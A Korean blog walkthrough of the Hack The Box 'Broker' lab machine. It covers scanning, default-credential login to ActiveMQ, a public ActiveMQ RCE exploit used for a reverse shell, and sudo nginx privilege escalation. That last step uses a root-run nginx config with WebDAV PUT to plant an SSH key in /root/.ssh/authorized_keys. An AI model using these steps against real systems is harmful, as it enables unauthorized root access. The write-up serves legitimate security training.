---
title: "Broker"
date: 2025-02-07
update: 2025-02-07
tags:
  - HTB
  - sudo-l
  - 리눅스
---
## Broker 요약
![](https://velog.velcdn.com/images/h3llanut3lla/post/68b13905-0b9c-4d3a-aff0-d787acc4723c/image.png)

Broker는 Apache ActiveMQ를 호스팅하는 쉬운 난이도의 리눅스 머신이다. 
'Apache ActiveMQ' 버전을 찾아보면 원격 코드 실행 (Unauthenticated Remote Code Execution)에 취약하다는 것을 알 수 있으며 이를 악용해서 타겟 시스템 초입을 할 수 있다. 이후, 권한상승을 위한 정보를 얻다보면 잘못된 sudo 구성을 찾을 수 있고, `sudo /usr/sbin/nginx` 를 통해 가장 높은 권한인 root 권한을 얻을 수 있다. 이 방식은 'Zimbra' 취약점 디스클로져와 비슷하다.

## 정보 수집
### Nmap 포트 스캔
TCP 스캔내용
```sh
└─$ nmap -sC -sV 10.10.11.243                 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-01 13:33 AEST
Nmap scan report for 10.10.11.243
Host is up (0.016s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-title: Error 401 Unauthorized
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
HTTP 포트가 열려 있으니 우선 들어가보자. 

### 80-HTTP
![](https://velog.velcdn.com/images/h3llanut3lla/post/38604c0c-c362-4cd4-a2df-e10dfecc5f58/image.png)
여기에 디폴트 유저네임 `admin` 비밀번호 `admin` 으로 로그인하면 아래와 같이 정확한 버전정보를 확인할 수 있다. 
>Version 5.15.15
![](https://velog.velcdn.com/images/h3llanut3lla/post/74d467cb-1171-416a-a42d-ceaafee12d08/image.png)

## 초입
`ActiveMQ 5.15.15 github` 혹은 `ActiveMQ 5.15.15 exploits` 라고 구글에 검색해보면 여러 엑스플로이트들이 나오는데, 나는 그 중 https://github.com/X1r0z/ActiveMQ-RCE/tree/main 이걸 사용했다. 

`poc.xml` 파일에 리버스쉘을 넣어주면 된다.

```xml
<list>
  <value>여기에 리버스 쉘 입력</value>
</list>
```

수정된 `poc.xml`
![](https://velog.velcdn.com/images/h3llanut3lla/post/491ee409-7cd0-45a2-a996-9f2fac982eea/image.png)

그렇다면 이렇게 타겟에 쉘이 생긴것을 확인할 수 있다 (우측 상단).
![](https://velog.velcdn.com/images/h3llanut3lla/post/7673de1b-d013-4bbd-986d-66d1b431be92/image.png)

## 권한 상승
`sudo` 로 사용 가능한 명령어를 확인하기 위해 `sudo -l` 이라고 쳐보면 `/usr/sbin/nginx` 가 권한 상승 없이 쓸 수 있는것을 확인할 수 있다.  
![](https://velog.velcdn.com/images/h3llanut3lla/post/2f6ed5c9-2163-4c51-bfe9-a3f6e1f88b19/image.png)

`nginx` 헬프 페이지를 보면 친절하게도 아래와 같이 버전정보를 확인할 수 있다. 
![](https://velog.velcdn.com/images/h3llanut3lla/post/d40d38a9-a20a-4327-9f97-8ec02b03b47f/image.png)

[Zimbra 디스클로져](https://github.com/advisories/GHSA-w7p3-hmmp-qmx6)와 같은 방식으로 진행해보자. 

`nginx` 구성파일중 `user-www-data` 라고 작성되어 있는 부분을 `root` 로 바꿔주면 된다. 
![](https://velog.velcdn.com/images/h3llanut3lla/post/0c303d62-bd24-4a0e-8f86-00da12b5c4c8/image.png)

아래와 같은 `pwn.conf` 라는 새 구성파일을 만들어준다.
```sh
user root; # 워커 프로세스가 root 권한으로 실행
worker_processes 4;
pid /tmp/nginx.pid;
events {
		worker_connections 768;
}
http {
	server {
		listen 1337;
		root /;
		autoindex on;
		dav_methods PUT;
	}
}
```

![](https://velog.velcdn.com/images/h3llanut3lla/post/b7b868a1-578b-4de5-bfd0-b0cdab7c91dd/image.png)
새로 만든 `pwn.conf` 가 잘 실행되었는지 확인하기 위해, 열린 포트를 보면 아래와 같이 포트 1337이 열린것을 볼 수 있다. 
![](https://velog.velcdn.com/images/h3llanut3lla/post/906e1180-82e5-4365-b8c5-7a05a351eb05/image.png)

그럼 이제 `/root/.ssh/authorized_keys` 에 대한 공개 SSH키를 만들어보자. 
![](https://velog.velcdn.com/images/h3llanut3lla/post/7700d7cb-b3f7-4e86-a8b8-5df4cc597c84/image.png)

칼리에서 
```sh
# SSH키 생성
ssh-keygen -f broker

# 생성된 키를 타겟에 전달
curl 10.10.11.243:1337/root/.ssh/authorized_keys --upload-file broker.pub
```

그리고 키를 이용해 SSH로 접속하면
```sh
ssh -i broker root@10.10.11.243
```
![](https://velog.velcdn.com/images/h3llanut3lla/post/f5039481-5ee3-4380-9be3-b14aed525772/image.png)

`root`로 권한이 상승된것을 확인할 수 있다. 